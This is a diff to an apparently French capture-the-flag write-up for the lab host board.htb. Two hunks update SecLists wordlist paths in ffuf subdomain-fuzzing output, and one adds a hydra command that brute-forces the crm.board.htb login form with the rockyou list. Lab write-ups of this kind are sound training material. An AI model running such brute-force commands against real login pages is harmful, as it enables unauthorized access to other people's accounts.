@@ -137,7 +137,7 @@ On obtient le résultat suivant:
       {
         "name": "wordlist",
         "keyword": "FUZZ",
-        "value": "/home/bhugo97/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt",
+        "value": "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
         "encoders": "",
         "template": ""
       }
@@ -189,7 +189,7 @@ On obtient le résultat suivant:
     "url": "http://board.htb",
     "verbose": false,
     "wordlists": [
-      "/home/bhugo97/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt"
+      "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
     ],
     "http2": false,
     "client-cert": "",
@@ -204,6 +204,7 @@ En regardant sur `exploit-db.com` on trouve que la version `17.0.1` est vulnéra
 
 Avec ces informations en main, on va tenter une attaque sur le login avec hydra:
 ```bash
+hydra -v -V -d -l username -P /home/kali/rockyou.txt -t 16 -m "/index.php?mainmenu=home:cont1=^PASS^&bogus=&submit=Log+in:F=incorrect" http-post-form:/crm.board.htb
 ```
 
 On va aussi scanner les répertoires du nouveau sous-domaine avec dirb:
